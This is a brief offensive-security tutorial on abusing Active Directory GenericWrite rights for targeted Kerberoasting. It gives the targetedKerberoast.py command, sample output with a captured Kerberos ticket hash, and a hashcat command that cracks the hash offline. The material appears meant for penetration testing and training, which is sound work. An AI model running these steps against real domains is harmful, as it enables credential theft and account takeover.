**GenericWrite** is an Active Directory permission that allows a principal to **modify writable attributes of an AD object**.

When applied to a **user object**, GenericWrite allows:

- Modifying attributes such as `servicePrincipalName`    
- Adding or removing SPNs
- Abusing Kerberos-based authentication mechanisms

This permission alone is sufficient to perform **Targeted Kerberoasting**.

---

## Why GenericWrite Enables Targeted Kerberoasting

Kerberos allows requesting a service ticket (TGS) for **any valid SPN**.  
If you can **write an SPN** to a user account:

- The user becomes Kerberoastable.
- The issued ticket is encrypted with the **user’s NTLM hash**.
- The ticket can be cracked offline.


---

## Attack Process Using targetedKerberoast.py

**Preconditions**

- You control a valid domain user (**controlledUser**)
- That user has **GenericWrite** over **targetUser**
- LDAP and Kerberos access to the Domain Controller

#### Step 1: Verify GenericWrite

Using BloodHound:

- Edge:  
    `controlledUser → GenericWrite → targetUser`

This confirms write access to the target account.



#### Step 2: Execute Targeted Kerberoasting

**What the tool does internally**

1. Binds to LDAP as `controlledUser`
2. Searches for users where GenericWrite is available
3. Adds a **temporary fake SPN** to the target user
4. Requests a Kerberos TGS for that SPN
5. Extracts the Kerberos hash
6. (Optionally) removes the fake SPN

```bash
targetedKerberoast.py -v -d domain.local -u controlledUser -p 'ItsPassword'
```

Output example:

```
[+] Added SPN fake/http to targetUser
[+] Requesting TGS
$krb5tgs$23$*targetUser$DOMAIN.LOCAL$fake/http*...
[+] SPN removed
```

The hash can now be cracked offline.

#### Step 4: Crack the Hash

```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

